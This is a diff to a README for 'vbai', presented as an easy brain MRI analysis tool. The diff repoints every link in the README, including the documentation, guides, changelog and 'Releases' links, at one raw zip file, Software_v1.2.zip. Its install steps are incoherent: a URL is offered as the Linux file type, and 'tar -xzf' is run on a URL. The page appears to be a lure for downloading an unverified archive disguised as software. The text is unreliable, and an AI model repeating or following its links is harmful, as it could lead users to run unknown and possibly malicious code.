@@ -1,7 +1,7 @@
 # 🧠 vbai - Effortless Brain MRI Analysis Made Easy
 
 ## 📦 Download Now
-[![Download vbai](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)
+[![Download vbai](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,11 +25,11 @@ Before you get started, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To download vbai, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)
+To download vbai, visit this page to download: [GitHub Releases](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of vbai.
-3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip` for Linux).
+3. Download the appropriate file for your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, or `https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip` for Linux).
 4. Follow the installation steps specific to your platform.
 
 ### For Windows Users
@@ -46,9 +46,9 @@ To download vbai, visit this page to download: [GitHub Releases](https://raw.git
 
 ### For Linux Users
 
-1. Download the `https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip` file.
+1. Download the `https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip` file.
 2. Open a terminal and navigate to the download location.
-3. Extract the files using `tar -xzf https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip`.
+3. Extract the files using `tar -xzf https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip`.
 4. Follow the README instructions included in the extracted folder to complete the installation.
 
 ## 💻 How to Use vbai
@@ -74,9 +74,9 @@ If you need further assistance, feel free to open an issue in the repository.
 
 For more information on how to use vbai, check out the following resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)
-- [User Guides](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)
-- [Example Projects](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)
+- [Official Documentation](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)
+- [User Guides](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)
+- [Example Projects](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)
 
 ## ⚖️ License
 
@@ -84,10 +84,10 @@ vbai is licensed under the MIT License. You can use and modify it according to y
 
 ## 📅 Changelog
 
-For an up-to-date list of changes and improvements, visit the [Changelog](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip) section.
+For an up-to-date list of changes and improvements, visit the [Changelog](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip) section.
 
 ## 📞 Contact
 
 For questions or feature requests, reach out through the Issues section on GitHub or contact the maintainers directly.
 
-[![Download vbai](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)](https://raw.githubusercontent.com/kurihuer/vbai/main/vbai/models/vbai-v1.2.zip)
+[![Download vbai](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)](https://github.com/kurihuer/vbai/raw/refs/heads/main/vbai/training/Software_v1.2.zip)
